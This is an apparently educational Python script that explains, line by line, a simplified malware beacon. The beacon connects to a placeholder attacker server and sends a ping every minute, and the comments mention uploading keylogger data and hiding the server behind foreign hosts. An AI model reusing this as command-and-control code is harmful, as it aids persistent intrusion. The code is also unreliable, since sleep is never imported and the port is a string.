'''
My goal for this script is practice with understanding
the socket library and its uses. This script is a detailed
documentation of a simplified beacon script. If youre
new I hope this can help you understand the script
thoroughly.
kyleareilly.github.io
'''
# Lets begin :)

'''
This line imports the 'socket' module into our script,
which provides a set of functions and classes for network communication
Socket programming using the socket library in Python is very 
common and widely used for network communication. 
It is part of the Python Standard Library, making it a standard tool 
for network programming in Python.
'''

import socket # Import Module

'''
Here, the code defines two variables: ip_destination and port_destination. 
These variables are meant to store the IP address and port number of 
the attacker's server. The attacker's server is where the beacon data will be sent.

An attacker often uses servers out of country along with VPNs or Proxys
as this IP to increase anonymity and jurisdictional restrictions
'''


ip_destination = "Desired IP" # Typically an attacker for the beacon to ping back to
port_destination = "Desired Port"  # What port to ping back to

'''
This section of the code creates a socket (s) for network communication. It uses 
the socket.AF_INET address family (IPv4) and the socket.SOCK_STREAM socket type (indicating a TCP socket). 
Then, it establishes a connection to the attacker's server 
by calling s.connect() with the specified IP address and port number.

An example: if you wanted an IPv6 and UDP transmission you would use
AF_INET6 and SOCK_DGRAM

There are many options to choose from. Here we are using the standard
IPv4 and TCP
'''
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip_destination, port_destination))

'''
This part of the code enters into an infinite loop (while True) 
that continuously sends a beacon message to the attacker's server. 
The beacon message is "Ping, Im still active!", which can be any data or 
signal chosen by the attacker.

Here's how the loop works:

s.send(beacon_data.encode()): This line sends the beacon_data to the attacker's server 
after encoding it to bytes. The encode() method converts the string into bytes suitable 
for transmission over the network.

sleep(60): After sending the beacon, the code waits for 60 seconds (1 minute) before 
sending the next beacon. This is achieved using the sleep() function, which pauses 
the program's execution for the specified number of seconds.
'''
# Loop to send beacons periodically
while True:
    beacon_data = "Ping, Im still active!"  # This can be any data or a signal
    # beacon_data can also be used to execute tasks or upload data, for example keylogger files.
    s.send(beacon_data.encode())
    # Wait for some time before sending the next beacon
    sleep(60)  # Sleep for 60 seconds, for example

'''
The purpose of this code, as previously discussed, is to establish a 
connection to the attacker's server and periodically send a beacon message to maintain 
communication with the compromised system. However, it's important to note that using 
such code for malicious purposes is illegal and unethical. Cybersecurity professionals 
and law enforcement agencies work to detect and prevent 
such activities to protect computer systems and networks.d
'''
